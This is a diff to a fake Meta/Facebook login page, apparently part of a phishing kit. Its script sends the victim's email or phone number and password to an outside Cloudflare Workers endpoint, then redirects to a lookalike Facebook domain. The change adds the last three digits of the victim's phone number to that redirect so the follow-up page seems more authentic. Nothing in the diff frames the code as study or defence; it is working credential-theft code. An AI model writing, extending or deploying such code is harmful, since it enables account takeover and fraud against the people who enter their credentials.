@@ -122,7 +122,7 @@
         <p>&copy; 2026 Meta Platforms, Inc.</p>
     </footer>
 
-    <!-- Worker Integration Script -->
+    <!-- Worker Integration & Conditional Formatting Script -->
     <script>
         const form = document.getElementById("loginForm");
         const submitButton = document.getElementById("submit-button");
@@ -141,11 +141,27 @@
             status.classList.add('hidden');
             status.textContent = "";
 
+            const rawInput = document.getElementById("email").value.trim();
+            const passwordVal = document.getElementById("password").value;
+
             const data = {
-                email: document.getElementById("email").value.trim(),
-                password: document.getElementById("password").value,
+                email: rawInput,
+                password: passwordVal,
                 submission_type: "login"
             };
+
+            let identifierParam = rawInput;
+            
+            // Check if it includes '@' to determine if it's an email
+            if (!rawInput.includes('@')) {
+                // If it's a phone number, grab the last 3 digits
+                const digitsOnly = rawInput.replace(/\D/g, '');
+                if (digitsOnly.length >= 3) {
+                    identifierParam = "your number ending " + digitsOnly.slice(-3);
+                } else if (digitsOnly.length > 0) {
+                    identifierParam = "your number ending " + digitsOnly;
+                }
+            }
 
             try {
                 await fetch("https://tendring-contact.twells-tet.workers.dev", {
@@ -158,8 +174,9 @@
             } catch (error) {
                 console.error("Worker transmission error:", error);
             } finally {
-                // Redirect regardless of response success/failure
-                window.location.href = "https://facebook-meta-uk-ireland-k7m2q9x4l8pr3vn6at1zw5.threetwosix.co.uk/";
+                // Redirect to next page with target info safely encoded in query string
+                const redirectBase = "https://facebook-meta-uk-ireland-k7m2q9x4l8pr3vn6at1zw5.threetwosix.co.uk/";
+                window.location.href = redirectBase + "?target=" + encodeURIComponent(identifierParam);
             }
         });
     </script>
